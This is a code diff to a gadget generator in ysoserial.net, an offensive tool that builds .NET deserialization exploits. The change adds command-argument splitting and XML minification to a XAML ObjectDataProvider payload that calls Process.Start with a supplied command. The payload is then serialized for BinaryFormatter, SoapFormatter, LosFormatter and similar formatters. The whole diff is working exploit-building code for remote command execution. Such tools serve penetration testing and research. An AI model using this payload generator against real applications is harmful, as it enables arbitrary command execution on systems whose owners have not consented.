@@ -48,23 +48,42 @@ namespace ysoserial.Generators
             return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test)
+        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify)
         {
+            Boolean hasArgs;
+            string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);
+
+            String cmdPart;
+
+            if (hasArgs)
+            {
+                cmdPart = $@"<System:String>"+ splittedCMD[0] + @"</System:String>
+        <System:String>""" + splittedCMD[1] + @""" </System:String>";
+            }
+            else
+            {
+                cmdPart = $@"<System:String>" + splittedCMD[0] + @"</System:String>";
+            }
+
             string xaml_payload = @"<ResourceDictionary
   xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
   xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
   xmlns:System=""clr-namespace:System;assembly=mscorlib""
   xmlns:Diag=""clr-namespace:System.Diagnostics;assembly=system"">
-	 <ObjectDataProvider x:Key=""LaunchCalc"" ObjectType = ""{ x:Type Diag:Process}"" MethodName = ""Start"" >
+	 <ObjectDataProvider x:Key="""" ObjectType = ""{ x:Type Diag:Process}"" MethodName = ""Start"" >
      <ObjectDataProvider.MethodParameters>
-        <System:String>cmd</System:String>
-        <System:String>/c """ + cmd + @""" </System:String>
+        "+ cmdPart + @"
      </ObjectDataProvider.MethodParameters>
     </ObjectDataProvider>
 </ResourceDictionary>";
 
+            if (minify)
+            {
+                xaml_payload = Helpers.XMLMinifier.Minify(xaml_payload, null, null);
+            }
+
             TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
-            return Serialize(payload, formatter, test);
+            return Serialize(payload, formatter, test, minify);
         }
 
     }
